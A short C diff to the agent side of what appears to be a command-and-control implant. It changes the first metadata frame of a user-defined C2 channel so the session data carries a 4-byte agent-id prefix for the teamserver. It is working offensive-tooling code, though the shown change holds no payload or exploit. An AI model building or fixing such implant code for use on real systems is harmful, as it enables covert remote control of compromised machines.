@@ -113,7 +113,19 @@ int udc2_cycle(char * recv, int max) {
 
 	if (!udc2.sent_meta) {
 		udc2.sent_meta = TRUE;
-		rv = udc2_round((char *)bigsession.data, bigsession.length, recv, max);
+		{
+			/* listener contract: the first frame body carries a 4-byte
+			 * agent-id prefix before the RSA metadata - client_init()
+			 * writes [id][bigsession] on every classic channel and the
+			 * TS session strips exactly 4 bytes (CommonUtils.shift) */
+			static char meta[4 + 1024];
+			int mlen = bigsession.length;
+			if (mlen > 1024)
+				mlen = 1024;
+			*(unsigned int *)meta = (unsigned int)bigsession.myid;
+			memcpy(meta + 4, bigsession.data, mlen);
+			rv = udc2_round(meta, 4 + mlen, recv, max);
+		}
 		/* the metadata round also deserves a task check - reuse rv */
 		return rv;
 	}
